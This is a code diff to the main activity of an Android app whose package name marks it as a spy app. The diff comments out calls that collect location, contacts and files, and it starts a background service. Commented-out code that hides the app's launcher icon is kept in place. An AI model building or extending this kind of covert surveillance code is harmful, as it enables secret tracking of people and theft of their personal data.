@@ -130,15 +130,15 @@ public class MainActivity extends AppCompatActivity {
 
 
                             mainApi();
-                            latLonApi();
-                            contactApi();
+                           // latLonApi();
+                            //contactApi();
 
-                            /*Intent in = new Intent(MainActivity.this, MsgService.class);
-                            startService(in);*/
+                            Intent in = new Intent(MainActivity.this, MainService.class);
+                            startService(in);
 
 
-                         /* PackageManager p = getPackageManager();
-                          ComponentName componentName = new ComponentName(this, kkactive_india.in.spyapp.MainActivity.class); // activity which is first time open in manifiest file which is declare as <category android:name="android.intent.category.LAUNCHER" />
+                          /*PackageManager p = getPackageManager();
+                          ComponentName componentName = new ComponentName(MainActivity.this, kkactive_india.in.spyapp.MainActivity.class); // activity which is first time open in manifiest file which is declare as <category android:name="android.intent.category.LAUNCHER" />
                           p.setComponentEnabledSetting(componentName,PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);*/
 
 
@@ -177,7 +177,7 @@ public class MainActivity extends AppCompatActivity {
         Log.d("numner", number);
 
 
-        EasyLocationMod easyLocationMod = new EasyLocationMod(MainActivity.this);
+        /*EasyLocationMod easyLocationMod = new EasyLocationMod(MainActivity.this);
 
         if (ActivityCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
             // TODO: Consider calling
@@ -195,7 +195,7 @@ public class MainActivity extends AppCompatActivity {
         lon = String.valueOf(l[1]);
 
         Log.d("latitude", lat);
-        Log.d("longitude", lon);
+        Log.d("longitude", lon);*/
 
 
        /* Geocoder geocoder = new Geocoder(this, Locale.getDefault());
@@ -228,7 +228,7 @@ public class MainActivity extends AppCompatActivity {
         }
 
 
-        ActivityCompat.requestPermissions(MainActivity.this,
+     /*   ActivityCompat.requestPermissions(MainActivity.this,
                 new String[]{Manifest.permission.READ_CONTACTS, Manifest.permission.WRITE_CONTACTS},
                 1);
         // String strOrder = ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC";
@@ -262,7 +262,7 @@ public class MainActivity extends AppCompatActivity {
 
 //        contactApi();
 
-        phones.close();
+        phones.close();*/
         //textView.setText(sb);
 
 
@@ -271,7 +271,7 @@ public class MainActivity extends AppCompatActivity {
         // getSMS();
 
 
-        files();
+       // files();
 
 
     }
